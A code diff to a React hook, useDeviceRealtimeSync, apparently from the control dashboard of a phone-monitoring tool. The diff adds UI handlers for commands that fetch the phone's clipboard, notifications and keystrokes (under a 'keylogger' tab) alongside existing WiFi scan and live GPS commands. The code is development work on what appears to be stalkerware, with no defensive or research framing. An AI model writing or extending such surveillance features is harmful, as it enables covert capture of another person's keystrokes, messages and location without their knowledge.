@@ -106,8 +106,18 @@ export function useDeviceRealtimeSync({
             } else if (cmd === "sync_wifi" && currentTab === "security") {
               toast.success("WiFi scan completed on phone!");
               if (onRefreshTelemetry) onRefreshTelemetry("security");
+            } else if (cmd === "fetch_clipboard" && currentTab === "clipboard") {
+              toast.success("Clipboard fetched fresh from phone!");
+              if (onRefreshTelemetry) onRefreshTelemetry("clipboard");
+            } else if (cmd === "fetch_notifications" && currentTab === "notifications") {
+              toast.success("Notifications fetched fresh from phone!");
+              if (onRefreshTelemetry) onRefreshTelemetry("notifications");
+            } else if (cmd === "fetch_keystrokes" && currentTab === "keylogger") {
+              toast.success("Keystrokes fetched fresh from phone!");
+              if (onRefreshTelemetry) onRefreshTelemetry("keylogger");
             } else if (cmd === "fetch_location" && currentTab === "map") {
               toast.success("Live GPS fix confirmed from phone!");
+              onRefreshActiveTab("map");
             }
             onRefreshLightStatus();
           }
